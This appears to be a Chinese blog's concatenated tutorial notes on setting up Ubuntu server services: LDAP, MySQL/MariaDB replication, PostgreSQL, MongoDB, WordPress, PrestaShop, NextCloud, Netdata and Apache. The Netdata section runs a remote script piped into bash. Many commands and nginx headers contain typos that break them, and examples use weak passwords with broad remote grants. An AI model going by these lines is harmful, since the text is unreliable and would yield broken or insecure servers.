hostnamectl set-hostname ldap.lab.com reboot 安装 OpenLDAP # Ubuntu Linux中默认的LDAP实现 sudo apt install slapd ldap-utils # slapd 是服务端和后台进程(即LDAP server) # ldap-utils （ldap工具） ldapadd # 添加数据 ldapdelete # 删除数据 ldapmodify # 修改 ldapsearch # 查询（最常使用） ldappasswd # 修改密码 ... ... 修改配置文件 # sudo vim /etc/ldap/ldap.conf BASE dc=lab,dc=com # 目前和dns的域名保持一直即可 URI ldap://ldap.lab.com:389 # 可以通过这个地址对..进行查询 初始化配置 # 一次就够了!!! sudo dpkg-reconfigure slapd # 还可以设置一次密码 # 数据库建议选择MDB 验证 # 多种验证方式 sudo slapcat sudo tree /etc/ldap/slapd.d/ # 有内容就可 # 默认管理员帐号 admin ldapsearch -x -LLL -b dc=lab,dc=com ldapsearch -x -LLL -b dc=lab,dc=com dn # 后面的内容是筛选 # -x 简单身份验证 # -LLL 以标准LDIF文件格式显示结果 # -b 基地址 向目录中添加记录 保存信息 # 保存信息到文件 # vim add.ldif # ou: 物理的层级结构划分 dn: ou=People,dc=lab,dc=com objectClass: organizationalUnit ou: People # 物理的 dn: ou=Group,dc=lab,dc=com # ou的名称叫Group, 一个对象只能在一个ou中, ou是物理上的 objectClass: organizationalUnit ou: Group # 逻辑的 # 组帐号s dn: cn=delevopment,ou=Group,dc=lab,dc=com # 创建一个组，cn别名 objectClass: organizationalUnit cn: delevopment gidNumber: 3000 # 用户帐号 dn: uid=zhangsan,ou=People,dc=lab,dc=com # 创建一个组，cn别名 objectClass: inetOrgPerson # 继承某些对象类型 objectClass: posixAccount objectClass: shadowAccount uid: zhangsan sn: zhang givenName: san cn: san zhang # 别名 displayName: San Zhang uidNumber: 2000 gidNumber: 3000 # 让用户加入某个组 userPassword: 123465 loginShell: /bin/bash homeDirectory: /home/zhangsan/ 导入： ldapadd -x -D cn=admin,dc=lab,dc=com -W -f add.ldif # -x 简单身份验证 # -D 指定管理员帐号(完整的别名： cn=admin,dc=lab,dc=com) # -W 提示输入密码 # -f 指定ldif文件 验证 ldapsearch -x -LLL -b dc=lab,dc=com 'uid=zhangsan' cn sn gidNumber uidNumber givenName # 查看属性类型和值 参考网址 https://ldapwiki.com/wiki/ObkectClass#Types 修改数据 跟上面是类似的 Web管理 手动写配置太麻烦，图形化的简化了操作 Web应用程序(有很多种)： ldap-account-manager (lam) sudo apt install apache2 sudo apt install php php-cgi libapache2-mod-php php-common php-pear php-mbstring sudo a2enconf php7.2-cgi # 激活这个模块 sudo systemctl reload apache2 sudo systemctl restart apache2 sudo apt install ldap-account-manager # ldap-account-manager使用的数据库使用的是目录服务的数据库，但是他的数据也没有写到数据库中，而是存在了配置文件中 # 访问即可 # http:/192.168.0.104/lam # 点击右上角 LAM configuration 配置 edit server... , 进行简单配置 # 其他配置根据自己需求来改 设置安全访问 sudo vim /etc/apache2/conf-enabled/ldap-account-manager.conf #Require all granted 注释掉所有ip可访问 Require ip 127.0.0.1 192.168.0.0/24 # 重启服务 其他ldap基于web的管理工具 # phpLDAPAdm","date":"2020-05-07","objectID":"/ubuntu-server-ldap/:0:0","tags":["LDAP","Linux","ubuntu"],"title":"ubuntu server-LDAP","uri":"/ubuntu-server-ldap/"},{"categories":["Linux"],"content":"ubuntu-server-数据库管理服务 数据就是生产力 数据就是应用的核心 按照结构组织，存储和管理数据的仓库 Oracle, DB2, MySQL, MSSQL, PostgreSQL, Infomix, MongoDB ","date":"2020-05-01","objectID":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/:0:0","tags":["Linux","ubuntu","ubuntu-server-数据库管理服务"],"title":"ubuntu server- ubuntu-server-数据库管理服务","uri":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"数据库管理系统(DBMS) ","date":"2020-05-01","objectID":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/:1:0","tags":["Linux","ubuntu","ubuntu-server-数据库管理服务"],"title":"ubuntu server- ubuntu-server-数据库管理服务","uri":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"MySQL数据库管理 安装 sudo apt install mysql-server 安全配置 sudo mysql_secure_installation # 建议禁止root远程登录 # 这里设置的root的密码不是，后面才设置, 因为初始身份认证方式是auth_socket Root帐号密码登录 sudo mysql # 初始身份认证方式是auth_socket，所以暂时不需要输入密码 SELECT user,host,authentication_string, plugin,host FROM mysql.user; # 给root设置密码认证方式mysql_native_password ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '12345678'; FULSH PRIVILEGES; # 登录 mysql -u root -p 创建数据库个人帐号(建议不要使用root进行运行,而应该使用个人帐号, 且密码不能相同) create user 'xps'@'%' identified by '12345678'; # 赋予权限(4级) # *.* 是哪个库哪个表，这里表示所有库所有表 grant all privileges on *.* to 'xps'@'%' with grant option; 修改密码 set password for 'xps'@'%'=password('12345678'); 网络访问帐号(可以远程访问) # 一般这种情况，都限制要操作的库和操作 # % use mysql # 直接grant赋予权限，就可以创建不存在的用户 grant all privileges on *.* to admin@'%' identified by '12345678' with grant option; # 移除权限 revoke all on db_name from user_name; # 查看密码策略(一旦允许网络连接，密码级别就会变成中安全级别了) select @@validate_password_policy; 编辑配置文件 # sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf # 修改侦听网卡为自己网卡的ip地址 bind-address = 192.168.0.112 # 重启网卡 # 使用mysql客户端连接， 或Falcon等图形化客户端 mysql -h 19.168.0.112 -u root ","date":"2020-05-01","objectID":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/:2:0","tags":["Linux","ubuntu","ubuntu-server-数据库管理服务"],"title":"ubuntu server- ubuntu-server-数据库管理服务","uri":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"SQL语句 增删改查 最基本 -- 当前帐号 select user(); -- 查看已经有的库 select databases; -- 选取(切换)库 use test; select database(); -- 显示表(已选择库) show tables; -- 简单创建库 create database test; 创建表 create table users( id INT NOT NULL PRIMARY KEY AUTO_INCREMENT, name CHAR(25) NOT NULL, pass CHAR(25) NOT NULL, age INT(9) NOT NULL ) char的性能要优于varchar 插入记录 insert into users values(1,'xps','1234567890',20); insert into users(id,name,pass,age) values(null,'xps','1234567890',20); # 指定列 查看表结构 desc users; show create table users; # Engine=InnoDB 存储引擎 show full columns from users; 查询 select * frm users where age \u003c20 and age \u003e16; select name,pass from users order by age; select name,pass from users order by age desc; # 降序 select concat(name,0x7e,pass,0x7e) as user_pass from users; # concat 结合， 表头变成user_pass select group_concat(name, pass) from users; 修改记录 update users set name='xpsss' where id=1; 删除记录 delete from users where id=1; 删除表 drop table tests; drop table if exists tests; 删除库 drop database test; 查看数据引擎 show engines; # 修改存储引擎（这里指定表） alter table student engine=MYISAM; 修改表名 alter table student RENAME student2; 修改字段数据类型 alter table student MODIFY name varchar(30); 修改字段名 alter table student CHANGE name uname varchar(40); 增加字段 alter table student ADD techer_name vchar(20) NOT NULL after id; # 位置放在id字段的后面 删除字段 alter table student FROP teacher_name; 备份 备份导出 备份库，表 mysqldump -u root -p tes_db \u003edb_back.sql mysqldump -u root -p test_db users \u003edb_back.sql mysqldump --all-databases -u root -p \u003eall_db_back.sql 备份指定数据 # 先进入sql命令终端，进行导出 select * from users; \u003e q.sql ## 或者 # 1. 先把sql语句保存为文件， echo 'select * from users;' \u003e q.sql # 2.然后执行来进行导出 mysql -u root -p test \u003c q.sql \u003eout.csv 导出CSV show variables like '%secure%'; # 先找到备份路径，找到secure_file_priv路径就是默认导出的路径 # 保存， 并执行分隔或换行 select * from users into outfile '/var/lib/mysql-files/aaa.csv' fields terminated by ',' enclosed by lines '\"' terminated by '\\n'; 导入 导入 # 创建库的命令 mysqladmin -u root -p create db2 # 也可以在sql终端 create database xxx; # 导入 mysql -u root -p db2 \u003c db_bak.sql 导入CSV LOAD DATA INFILE '/var/lib/mysql-files/aaa.csv' INTO TABLE users FIELDS TERMINARED BY ',' ENCLOSED BY '\"' LINES TERMINARED BY \\n IGNORE 1 ROWS; ","date":"2020-05-01","objectID":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/:3:0","tags":["Linux","ubuntu","ubuntu-server-数据库管理服务"],"title":"ubuntu server- ubuntu-server-数据库管理服务","uri":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"MariDB 安装配置 安装 sudo apt install mariadb-server 安全认证 sudo mysql_secure_installation 改为密码认证 sudo mysql use mysql; select user.host,plugin,password from mysql.user; # 查看 update user set plugin='' where user ='root' # mysql_native_password或空就行 fulsh privileges; 配置文件 # /etc/mysql/mariadb.conf.d/50-server.cnf bind-address = 0.0.0.0 # 每一个网卡都会侦听3306 主备服务器(数据库复制) 复制 Replication Master -\u003e Slave 读/写 限定所有库，指定库，表 进行复制 复制原理 bin-log 二进制日志 所有DB事件先写入bin-log Slave从Master读取bin-log 用途 扩展：Slave分担master负载 分析：数据分析不影响Master 备份：作为一种数据备份手段 分布：异地保存数据副本（也可以实现应用访问本地库） 演示 1.安装两台独立的MariaDB服务器 复制之前用导入导出数据库的方式保持Master/Slave数据一致 复制前锁定库(禁止写入) # 生产环境 flush tables with read lock; 2.配置 Master # suo vim /etc/mysql/conf.d/mysql.cnf #增加如下配置 [mysqld] log-bin # 开启bin-log功能 binlog-do-db=test # binlog-ignore-db=\"mysql\" # 除了忽略的库，其他的全复制 server-id=1 3.配置master的mariadb远程访问 bind-address 0.0.0.0 4.重启服务 sudo systemctl restart mariadb 5.配置master 创建用户帐号 #192.168.0.111 是slave的地址， *.*允许复制所有数据库, replicate用户名 grant replicate *.* to 'replicate'@'192.168.0.111' with identified by 'passwd'; 6.配置Slave ## 1. # suo vim /etc/mysql/conf.d/mysql.cnf #增加如下配置 [mysqld] server-id=1 ## 2.开启远程访问bind-address 0.0.0.0 ## 3. 重启数据库服务 7.登录sql终端 # master_user是master服务器上创建的mysql的用户 change master to master_host=\"192.168.0.112\",master_user=\"replicate\",master_password='password'; 8.打开master锁 unlock tables; 9.查看slave状态 -- slave的sql终端 show slaves status\\G start slave; # 如果没启动，可以手动启动 测试效果 # 在master执行 cd test; insert into users values(1,'yyy','pass'); delete from users where id=1; # 在slave上查询，发现数据已经同步过来了，近乎实时 Mysqltuner – 配置调优工具包 安装 sudo apt install mysql 运行 sudo Mysqltuner 会生成一堆信息配置调优建议(绿色的表示没问题，其他颜色的可以根据帮助来优化) ","date":"2020-05-01","objectID":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/:4:0","tags":["Linux","ubuntu","ubuntu-server-数据库管理服务"],"title":"ubuntu server- ubuntu-server-数据库管理服务","uri":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"Postgresql 下一代关系数据库 配置和修改 高并发情况下性能优于MySQL 侦听端口 TCP 5432 安装 sudo apt install postgresql 身份认证 默认使用IDENT身份认证方式 使用与操作系统同名的数据库帐号(postgres相当与MySQL中的root) 进入 sudo -u postgres psql # 直接登录到库的名称(template1是默认生成的) sudo -u postgres psql template1 修改密码 # sql终端 # 使用加密的方式 alert user postgres with encrypted password 'your_passwd'; \\q # 退出 # bash终端 # 修改配置文件 vim /etc/postgresql/10/main/pg_hba.conf local all postgres md5 # 本地登录 所有数据库 身份 密码md5加密 # 重启服务 # 登录 -W输入密码 psql -U postgres -W -d db_name 配置文件 /etc/postgresql/\u003cversion\u003e/main # 配置文件目录 /etc/postgresql/10/main/pg_ident.conf # IDENT身份认证配置 /etc/postgresql/10/main/postgresql.conf # 网络身份认证配置 # listen_address='*' # IPV6 '::' 网络连接 # 客户端 sudo apt install postgresql-client # 设置允许哪些主机连接我们(必须指定掩码) vim /etc/postgresql/10/main/pg_hba.conf local all postgres 192.168.0.111/32 md5 #重启服务 # 客户端连接 psql -h 192.168.0.112 -U postgres -W -d db_name 创建帐号 # postgres权限太大，不建议平时使用 # F1 服务器端终端 sudo -u postgres createuser xps # gropuser xps # F2 sql命令行 create user foobar; # drop user xps 文档手册 sudo apt install postgresql-doc-10 /usr/share/postgresq-doc-10/html/index.html 官方文档: https://www.postgresql.org/docs/current/static/tutorial.html 基本指令 创建库 # sudo -u postgres createdb mydb; # 或 create database mydb; 删除库 sudo -u postgres dropedb mydb; # 或 drop database mydb; 创建表 create database users ( uname varchar(25); pwd carchar(25); date date ); `` 插入数据 ​```bash insert into users values('xps','1234567890','1997-07-07'); # 批量插入数据(数据提前保存) copy users from '/home/user/users.txt' 快捷命令 \\c db_name # 切换数据库 （use mydb;） \\c - username # 切换用户 \\l # 列出数据库(show databases;) \\dt # 列出表(show tables;) \\d table_name # 查看表结构 ","date":"2020-05-01","objectID":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/:5:0","tags":["Linux","ubuntu","ubuntu-server-数据库管理服务"],"title":"ubuntu server- ubuntu-server-数据库管理服务","uri":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"NoSQL概览与MongoDB 常见的NoSQL数据库类型 1.键值对类型 Paper推荐多看看 MongoDB 安装 sudo apt-get install -y mongodb 客户端 # 本地登录 mongo # 远程登录 mongo 192.168.0.112:27017/db_name # 常用管理命令 help 进入库 use mydb; # 如果不存入数据，他还是就没了 输入数据 # 创建文档集 db.createCollection('users') # 插入数据 db.users.insert({'name':'uuu','uid':123}) 查询库 show dbs show collections 多赋值 db.users.insert({'name':'uuu','uid':123,gid:[111,222,333]}) 查询 db.users.find(); db.users.findOne({'uid':1001}) db.users.findOne({'uid':{$gt：1000}}) # 大于 db.users.find({'uid':{$gt：1000}}) # 大于 db.users.find({$or: [{name:'ubuntu'}, {name;'centos'}]}) # or db.users.findOne({'uid':1001}, {name:0}) # name:0 不显示name字段 修改记录 db.users.update({'uid':1001}, {$set:{name:'hhh'}}) 删除记录 db.users.remove({'uid':1001}, ) 删除collection db.users.drop() 删库 db.dropDatabase() 详细用法参考官方文档…… ","date":"2020-05-01","objectID":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/:6:0","tags":["Linux","ubuntu","ubuntu-server-数据库管理服务"],"title":"ubuntu server- ubuntu-server-数据库管理服务","uri":"/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"LAMP环境安装WordPress WEB应用程序基础套件 操作系统( Linux ) WEB服务器( Apache、Nginx ) 数据库( MySQL、MariaDB、 PostgreSQL) 应用开发语言( PHP、Python、 Perl ) 大量开源应用基于LAMP开发 Wordpress Wiki Owncloud Phpmyadmin … … 安装LAMP(Linux + Apache + MySQL +PHP) 自动安装 # 一次性安装 tasksel 简单快捷 apt install tasksel # 运行工具 sudo tasksel # 选择安装包,q 勾选，确定即可 #测试 echo \"\u003c?php phpinfo();?\u003e\" \u003e /var/www/html/info.php 手动安装 apt install apache2 apt install mysqk-server mysql_secure_installation apt install php libapache2-mod php-mysql #测试 echo \"\u003c?php phpinfo();?\u003e\" \u003e /var/www/html/info.php WordPress 开源免费的个人博客系统 全球1/3的个人博客采用 基于LAMP开发 开箱即用 安装 wget http://wordpress.org/latest.tar.gz sudo tar -zxvf latest.tar.gz -C /var/www/html # 设置权限 sudo chown www-data:www_data -R /var/www/html/myshop # 还没有数据库 创建数据库 -- 进入sql命令行（建议用户名密码和库名不要这么简单易猜） create database wpdb; create user 'wpuser'@'localhost' identified by '12345678'; grant all on wpdb.* to 'wpuser'@'localhost' identified by '12345678' with grant option; flush privileges; 配置文件 cd /var/www/html/wordpress/ cp wp-config-sample.php wp-config.php # 从模板文件复制 vim wp-config.php # 修改库名，用户，密码 # 他会自动写进去表 虚拟主机 不建议使用默认站点 cd /etc/apache2/sites-available/ cp 000-default.conf myblog.conf vim myblog.conf ServerName www.myblog.com DocumentRoot /var/www/html/wordpress # 其他安全配置 启用站点 a2ensite myblog.conf a2dissite 000-default.conf # 禁用默认站点 systemctl reload apache2 Web配置 访问设置的域名http://myblog.com 改为中文 从官网下载中文语言包解压到/wp-content/目录下， 修改wp-config.php define('WPLANG', 'zh_CN') 或者直接下载中文版https://cn.wordpress.org ","date":"2020-05-01","objectID":"/ubuntu-server-lamp/:1:0","tags":["Linux","ubuntu","LMAP","LEMP"],"title":"ubuntu server-LAMP","uri":"/ubuntu-server-lamp/"},{"categories":["Linux"],"content":"PHPMyAdmin \u0026 电商网站搭建 phpMyAdmin 基于Web应用的MySQL管理应用, 本身也是一个应用程序 1.修改身份验证方式 # 进入sql终端 select user,host,plugin from mysql.user; \"auth_socket\" --\u003e \"mysql_native_password\" 2.安装PhpMyAdmin apt install phpmyadmin 3.修改/etc/apache2/apache2.conf主配置文件 # 包含phpmyadmin的配置文件 Include /etc/phpmyadmin/apache.conf 测试 http://wwwwww/phpmyadmin/ 电商网站搭建 安装prestashop开源的电商平台 开源免费 全球有25万台电商平台使用 基于LAMP套件 1.安装依赖包 sudo apt install php7.2-gd php7.2-xml php7.2-curl php7.2-zip 2.下载 wget https://download.prestashop.com/download/releases/prestashop_1.7.4.1.zip sudo unzip prestashop_1.7.4.1.zip -d /var/www/html/myshop sudo chown www-data:www_data -R /var/www/html/myshop 3.创建数据库 sudo mysql -- 进入sql命令行（建议用户名密码和库名不要这么简单易猜） create database myshop; create user 'myshop'@'localhost' identified by '12345678'; grant all on myshop.* to 'myshop'@'localhost' identified by '12345678' with grant option; flush privileges; 4.虚拟主机(不建议使用默认站点) cd /etc/apache2/sites-available/ cp 000-default.conf myshop.conf vim myshop.conf ServerName www.myshop.com DocumentRoot /var/www/html/myshop # 这里只配置了最简单的，其他的配置按照前面的章节自行配置 5.启用站点 sudo a2enmod rewrite # 启用这个模块 sudo a2ensite myshop.conf #a2dissite 000-default.conf # 禁用默认站点 systemctl reload apache2 6.访问站点，进行Web配置 表名的前缀不要默认，否则如果有漏洞，容易被猜解 安装完成之后，要删除install文件 这个网站源码是免费的，但是主题是收费的……且支付接口没国内的 ","date":"2020-05-01","objectID":"/ubuntu-server-lamp/:2:0","tags":["Linux","ubuntu","LMAP","LEMP"],"title":"ubuntu server-LAMP","uri":"/ubuntu-server-lamp/"},{"categories":["Linux"],"content":"LEMP环境安装NextCloud LEMP(Linux, Nginx, MySQ, PHP) Engine-x -\u003e Nginx 1.安装 sudo apt install nginx sudo apt install mariadb-server mariadb-client sudo mysql_secure_installation # 针对不同软件包，安装不同的组件，这里安装下面这些 sudo apt install php7.2 php7.2-fpm php7.2-mysql php7.2-mbstring php7.2-xml php7.2-gd php7.2-curl php7.2-imagick php7.2-zip php7.2-bz2 php7.2-intl # 配置php sudo vim /etc/php/7.2/fpm/php.ini cgi.fix_pathinfo=0 date.timezone = Asia/shanghai 2.配置Nginx # 这里使用默认站点 # sudo vim /etc/nginx/sites-available/default index index.php location ~\\.php$ { fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include snippets/fastcgi-php.conf; include fastcgi_params; } # 重启 sudo nginx -t sudo systemctl restart nginx 3.访问, 验证环境是否成功 4.下载NextCloud # NextCloud 免费开源的个人云盘 # 官网下载或wget下载 wget https://download.nextcloud.com/server/releases/nextcloud-13.0.4.zip sudo unzip nextcloud-13.0.4.zip -d /var/www/html/mycloud sudo chown www-data:www-data -R /var/www/html/mycloud 5.建库 -- 进入sql命令行 create database mycloud; create user 'mycloud'@'localhost' identified by '12345678'; grant all privileges on mycloud.* to 'mycloud'@'localhost' identified by '12345678' with grant option;; flush privileges; 6.生成证书(安全考虑) # 这里使用自签名证书 sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/mysite.key -out /etc/ssl/certs/mysite.pem 7.配置文件 # cd /etc/nginx/site-available/ # sudo vim mycloud.conf server { listen 80; server_name www.mycloud.com; # 不让访问者通过http访问，强制重定向 return 301 https://www.mycloud.com$request_uri; } server { listen 443 ssl http2; # 证书位置 ssl_certificate /etc/ssl/certs/mysite.pem; ssl_certificate_key /etc/ssl/private/mysite.key; # 头部 add_header Strict-Teansport-Security \"max-age-31536000\" always; # ssl增强版协议的头部 # 等经验丰富后，自己要添加头部信息你 add_header X-Conten-Type-Option nosniff; add_header X-XSS-Protection \"1;mode=block\"; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Doamin-Policies none; root /var/www/html/mycloud/; location = /robots.txt { allow all; log_not_found off; access_log off; } location = /.well-known/carddav { retun 301 $schema://$host/remote.php/dav; } location = /.well-known/calddav { retun 301 $schema://$host/remote.php/dav; } location = /.well-known/acme-challenge { allow all; } client_max_body_size 512M; fastcgi_buffers 64 4K; gzip off; error_page 403 /core/templates/403.php; error_page 404 /core/templates/404.php; location = / { rewrite ^ /ince.php$uri; } location = /(?:build|tests|config|lib|3rdparty|templates|data)/ { deny all; } # ....... } ## ......剩下详细的配置 8.启用站点配置 ln -s /etc/nginx/site-available/mycloud.conf /etc/nginx/site-enabled/mycloud.conf # reload 并 restart nginx 9.Data目录 # 文件资源默认会在项目根目录下的Data目录 # 建议不要放在默认位置, 这里放在上一级目录 sudo mkdir /var/www/html/cloud_data sudo chown www-data:www-data -R /var/www/html/cloud_data 10.网页设置 访问 https://xxxxx.com # 设置用户名/密码，数据库，data目录 # 注意账户安全哦(不要设置admin等) # 修改语言 11.客户端 sudo add-apt-repository ppa:nextcloud-devs/client sudo apt install nextcloud-client # 或官网下载PC和android的客户端 ","date":"2020-05-01","objectID":"/ubuntu-server-lamp/:3:0","tags":["Linux","ubuntu","LMAP","LEMP"],"title":"ubuntu server-LAMP","uri":"/ubuntu-server-lamp/"},{"categories":["Linux"],"content":"其他Web应用 1.Cockpit 基于Web的远程管理和系统监控 基于Web的远程管理应用 将所有组件打包在一起 不以来单独部署的LAMP/LEMP, 一条命令安装部署 安装 sudo apt install cockpit cockpit-docker 访问方式: https://www.com:9090 登录账户同操作系统 可以看到系统的详细信息，管理 可以添加其他安装了Cockpit的服务器在一个机器的Web界面安装(前提是登录窗口时候进行勾选), 多台服务器 官网地址: https://cockpit-projece.org Netdata 基于Web建构的Linux系统实时性能监视工具 cpu, 内存，硬盘，网络，进程，硬件 占用系统资源少(1-3%) 实时自动告警 系统出问题之前，往往有异常的征兆 依赖包 sudo apt install git zlib1g-dev uuid-dev libmnl-dev gcc make autoconf autoconf-archive autogen automake pkg-config curl python python-yaml python-mysqldb python-psycopg2 nodejs lm-sensors netcat 安装 bash \u003c(curl -Ss https://my-netdata.io/kickstart-static64.sh) # 现在不能访问了 # 或用apt安装 sudo apt install netdata # 访问 http://xxxxx.com:19999 开关 # 启动：位置根据系统会有不同。建议加上-D参数前台运行，不要后台运行 $ sudo netdata -D $ 或 $ sudo /usr/sbin/netdata -D # 或（Mac上） $ sudo /usr/local/sbin/netdata -D # 关闭（方法很多种，往往只有一种生效） $ sudo killall netdata # 或 $ sudo pkill -9 netdata # 或 $ sudo service netdata stop # 或 $ sudo /etc/init.d/netdata stop # 或 $ sudo systemctl stop netdata ","date":"2020-05-01","objectID":"/ubuntu-server-lamp/:4:0","tags":["Linux","ubuntu","LMAP","LEMP"],"title":"ubuntu server-LAMP","uri":"/ubuntu-server-lamp/"},{"categories":["Linux"],"content":"WWW介绍 www 万维网 静态网站：所有人看到的内容都一样 动态应用程序： 数据库、中间件 每个用户看到的内容不同 根据用户输入返回不同结果 访问方式 FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”） 传输协议 SSL基本被替代了，TSL使用最多 put常用于上传文件 options查看都支持哪些方法 header只是头部的信息(请求/响应) ","date":"2020-04-28","objectID":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/:1:0","tags":["Linux","Ubuntu","Web服务","Apache","Nginx","Tomcat","反向代理"],"title":"ubuntu server-Web服务","uri":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"HTTP协议 常见服务端响应状态码 更多详细状态码，见地址： http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html ","date":"2020-04-28","objectID":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/:2:0","tags":["Linux","Ubuntu","Web服务","Apache","Nginx","Tomcat","反向代理"],"title":"ubuntu server-Web服务","uri":"/ubuntu-server-web%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"Apache2 Apache软件基金会的一个开源Web服务器 模块化强大的扩展能力： SSO模块 并发限制模块 日志监控模块 WAF模块 负载均衡模块 音乐/图像处理模块 安装 sudo apt install apache2 # 默认侦听端口 TCP 80 通过众多directives进行配置 在Ubuntu中，directives分散于多个配置文件中 配置文件：conf-enabled(启用的)中的文件都是链接到conf-available(可用的)下的配置文件（创建了链接的才生效的，所以可以配置一些备用的不设置链接），修改完需要重启服务 模块目录：mods-enabled与mods-available，跟上面两者关系类似 站点：sites-enabled与sites-available 不同ip以及不同端口可以映射不同的网站 –\u003e 同一个ip同一个端口来设置多个网站(不同域名都解析到这个ip, 服务端根据域名字段[主机头]来判断返回哪个页面) –\u003e 即为虚拟主机 虚拟主机简单配置 一般先从available目录开始创建，至于启用与否还得配置enabled 本质上配置指令可以位于任何一个配置文件中 配置sites-available下讲解： # /etc/apache2/sites-available/000-default.conf # 默认虚拟主机 \u003cVirtualHost *:80\u003e # 匹配ip，*代表任意ip , 侦听任意ip的80端口 ServerName www.example.com # 设置主机头（虚拟主机的域名） ServerAdmin webmaster@localhost # 报错时显示的管理员邮箱 DocumentRoot /var/www/html # 指定Web根目录 ErrorLog ${APACHE_LOG_DIR}/error.log # 报错日志 CustomLog ${APACHE_LOG_DIR}/access.log combined # 访问日志 # 侦听端口 \u003c/VirtualHost\u003e 实验 创建ali和baid两个域名的虚拟主机 1.创建新的虚拟主机（在sites-available） # 复制两个配置文件 sudo cp 000-default.conf ali.conf sudo cp 000-default.conf baid.conf # 分别进行配置 ServerName www.ali.com DocumentRoot /var/www/ali # ServerName www.baid.com DocumentRoot /var/www/baid # 分别编辑页面文件 sudo vim /var/www/ali/index.html sudo vim /var/www/baid/index.html 2.创建链接(在sites-enabled) # 可以用ln 创建 # apache提供了更简单的方式 sudo a2ensite ali sudo a2ensite baid # 重新加载 service apache2 reload ## Note： ServerAlias *.lab.com # 域名通配符 sudo a2ensite mynewSite # 启用虚拟主机 sudo systemctl restart apache2.service # 重启服务 sudo a2dissite mynewSite # 停用虚拟主机（禁用某个站点） 3.这里做实验，域名就简单通过hosts文件做了解析 192.168.11.130 www.ali.com 192.168.11.130 www.baid.com 3.访问 侦听端口 /etc/apaches/ports.conf Apache中默认基本配置 1.索引文件index： DirectoryIndex ## 可以根据需求,手动修改索引页的名称（一般不建议修改） # /etc/apache2/mods-available/dir.conf \u003cIfModule mod_dir.c\u003e DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm # 有先后的执行顺序 \u003c/IfModule\u003e # Note： 若没有正确放置index索引文件，会看到文件列表，可能会有安全隐患 2.html格式展示目录列表：Options 【安全考虑】–\u003e去掉由于没有索引文件会显示文件列表的选项 ## /etc/apache2/apache2.conf 主配置文件 \u003cDirectory /var/www/\u003e # 对文件目录权限的配置 Options Indexes FollowSymLinks # Indexes:若没有索引文件,就会显示目录列表;去掉Indexes就不会显示列表了，提示\"权限拒绝\" AllowOverride None Require all granted \u003c/Directory\u003e # 重启服务 **3.Permission Denied ** 以上1,2两项都不匹配，就会显示\"权限拒绝\" 4.ErrorDocument 报错提示 【安全考虑】–\u003e 默认404或报错页面会泄露信息或扫描器，建议替换为我们自定义的页面–\u003e不告诉用户不成功的具体原因,只告诉他出错了 # /etc/apache2/conf-available/localized-error-pages.conf ErrorDocument 404 /error/404.html # 定义自己的页面 # 重启服务 5.基于目录的Options ## /etc/apache2/apache2.conf 主配置文件 \u003cDirectory /var/www/\u003e Options Indexes \u003c/Directory\u003e # 其他配置项(权限要最小化原则，安全起见) ExecCGI # 允许CGI脚本执行的目录(/usr/lib/cgi-bin) Includes # 允许服务端包含（一个html包含另一个html,模板化） IncludeNOEXEC # 允许包含，但进展CGI脚本exec、include # 重启服务 6.环境变量 # /etc/apache2/envvars 可以修改用户和组和pid等 User /Group # 服务器端应答客户端访问的账号(www-data) PidFile # /var/run/apache2/apache2.pid # 最大并发数（默认8192） APACHE_ULIMIT_MAX_FILES='ulimit -n 65536' 模块化 服务器核心只实现了基本功能 apache2 -l # 查看默认被编译到apache核心包里面的模块 其他功能通过模块实现 ubuntu编译动态加载模块实现运行时模块调用 apt search libapache2-mod # 搜索模块 sudo apt install libapache2-mod0auth-mysql # 安装模块 sudo a2enmod auth_mysql # 启用模块 sudo a2dismod auth_mysql # 禁用模块 开启HTTPS 